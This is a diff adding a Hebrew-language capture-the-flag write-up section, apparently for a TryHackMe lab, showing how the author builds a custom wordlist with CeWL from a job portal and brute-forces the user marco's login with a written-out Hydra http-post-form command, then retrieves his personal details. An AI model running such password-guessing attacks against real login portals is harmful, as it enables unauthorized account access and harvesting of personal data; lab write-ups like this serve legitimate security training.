@@ -105,5 +105,94 @@
 
 4. **פורט:** `5001`
 
+
+שלב 2 (LEVEL 2)
+
+
+
+
+<img width="1853" height="767" alt="image" src="https://github.com/user-attachments/assets/c65d9ef8-c311-4a1f-a665-21b190915656" />
+
+מרקו בנה ממשק התחברות פנימי לעובדים בכתובת jobs.thm:5002 והשתמש במילות מפתח נפוצות של החברה כסיסמאות.
+
+היעד הבא הוא פורטל התחברות לעובדים המאוחסן בכתובת jobs.thm:5002. התיאור רומז שמרקו השתמש במילות מפתח נפוצות הקשורות לחברה בתור הסיסמה שלו.
+
+כדי לחלץ מילות מפתח משמעותיות מתוך האפליקציה, השתמשתי ב-CeWL.
+
+הכלי CeWL הוא סורק אינטרנט (Web Crawler) שאוסף מילים מתוך אתרים ובונה מילונים מותאמים אישית (Custom Wordlists) השימושיים למתקפות סיסמה.
+
+התקנה:
+
+
+<img width="870" height="752" alt="image" src="https://github.com/user-attachments/assets/acb630b2-e9e0-494b-8048-76cb6583027e" />
+
+וההקתנת ספרייה gem install spider
+
+
+<img width="918" height="617" alt="image" src="https://github.com/user-attachments/assets/12278d70-eabb-4050-817c-8df110fc89f1" />
+
+אחרי היה עוד כמה התקנות:
+הנה סיכום מקוצר של כל צעד במשפט אחד:
+
+1. **`rbenv global system`** – החזרת הטרמינל להשתמש ב-Ruby המקורי של מערכת ההפעלה במקום בגרסה המבודדת.
+
+
+2. **`apt install -y cewl ruby-spider`** – התקנת כלי הסריקה יחד עם ספריית ה-Web Spider הדרושה להפעלתו ללא שגיאות.
+
+
+3. **`cewl -d 2 -m 6 --lowercase -w keywords.txt [http://10.114.178.3:5002](http://10.114.178.3:5002)`** – סריקת פורטל המשרות וחילוץ מילות מפתח באורך 6 תווים ומעלה לקובץ טקסט.
+
+
+<img width="897" height="427" alt="image" src="https://github.com/user-attachments/assets/aaaa0e00-4376-470e-9424-07fd9f703d48" />
+
+
+
+4. **`cat keywords.txt`** – הדפסת תוכן הקובץ בטרמינל כדי לאמת שהמילים חולצו ונשמרו בהצלחה.
+פקודה:
+
+<img width="910" height="786" alt="image" src="https://github.com/user-attachments/assets/5e70b4b1-c3d1-4330-bfe9-57489af8fb18" />
+
+
+Bash
+cewl -d 2 -m 6 --lowercase -w keywords.txt http://jobs.thm:5002
+-d 2: עומק סריקה של 2 רמות (Crawl Depth).
+
+-m 6: אורך מילה מינימלי של 6 תווים.
+
+--lowercase: המרת כל המילים לאותיות קטנות.
+
+-w keywords.txt: שמירת הפלט לקובץ בשם keywords.txt.
+
+לאחר יצירת המילון, פתחתי במתקפת Hydra נוספת המכוונת למשתמש marco.
+
+פקודה:
+
+Bash
+hydra -l marco \
+  -P keywords.txt \
+  -f -V -t4 \
+  -s 5002 \
+  jobs.thm http-post-form \
+  "/login:username=^USER^&password=^PASS^:Invalid credentials."
+כלי ה-Hydra עבר על מילות המפתח שנוצרו ולבסוף זיהה את הסיסמה הנכונה.
+
+
+<img width="893" height="273" alt="image" src="https://github.com/user-attachments/assets/43c2a9e6-0096-4293-a695-ce3002570b04" />
+
+באמצעות פרטי ההזדהות של מרקו, התחברתי לחשבון העובד שלו:
+
+<img width="907" height="612" alt="image" src="https://github.com/user-attachments/assets/1202c9a4-b4fb-4e95-88c0-0ac4f62385d6" />
+
+jobs.thm
+
+כאן השגנו מידע אישי על מרקו:
+
+שם מלא (Full Name): Marco Bianchi
+
+כינוי (Nickname): marky
+
+תאריך לידה (Birthdate): 14/02/1995
+
+
 5. **כתובת שרת:** `10.113.171.160` (או `firewall.thm` אם הוגדר ב-hosts)
 
